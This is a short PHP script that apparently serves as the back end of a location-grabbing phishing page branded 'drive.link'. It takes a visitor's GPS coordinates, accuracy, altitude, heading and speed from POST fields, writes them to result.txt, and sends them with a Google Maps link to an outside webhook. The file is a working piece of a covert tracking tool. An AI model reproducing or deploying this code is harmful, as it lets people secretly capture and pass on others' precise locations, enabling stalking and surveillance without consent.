<?php
include("webhook.php");
header('Content-Type: text/html'); {
  $lat = $_POST['Lat'];
  $lon = $_POST['Lon'];
  $acc = $_POST['Acc'];
  $alt = $_POST['Alt'];
  $dir = $_POST['Dir'];
  $spd = $_POST['Spd'];

  $data['info'] = array();

  $data['info'][] = array(
    'lat' => $lat,
    'lon' => $lon,
    'acc' => $acc,
    'alt' => $alt,
    'dir' => $dir,
    'spd' => $spd
  );

  $jdatastr = <<<EOD
  {
    "content": null,
    "embeds": [
      {
        "title": "Client GPS",
        "description": "Accurate GPS Location.",
        "color": 16736088,
        "fields": [
          {
            "name": "Latitude",
            "value": "$lat",
            "inline": true
          },
          {
            "name": "Longitude",
            "value": "$lon",
            "inline": true
          },
          {
            "name": "Location",
            "value": "[Google Maps](https://www.google.com/maps?q=$lat,$lon&ll=$lat,$lon&z=18)",
            "inline": true
          }
        ],
        "author": {
          "name": "[drive.link] GPS Location.",
          "url": "https://drive.link"
        },
        "footer": {
          "text": "drive.link"
        }
      }
    ]
  }
  EOD;
  $jdata = json_encode($data);

  $f = fopen('result.txt', 'w+');
  fwrite($f, $jdata);
  fclose($f);
  sendWebhook($jdatastr);
}
